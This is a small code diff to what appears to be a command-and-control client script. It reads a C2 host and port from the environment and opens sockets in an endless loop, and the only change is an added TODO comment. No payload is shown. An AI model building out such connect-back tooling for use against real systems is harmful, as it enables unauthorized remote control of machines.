@@ -13,6 +13,7 @@ def main():
     host = os.getenv('C2_HOST', '127.0.0.1')
     port = int(os.getenv('C2_PORT', '4040'))
     
+    # TODO: Ensure loop has proper exit condition
     while True:
         try:
             sock = socket.socket()
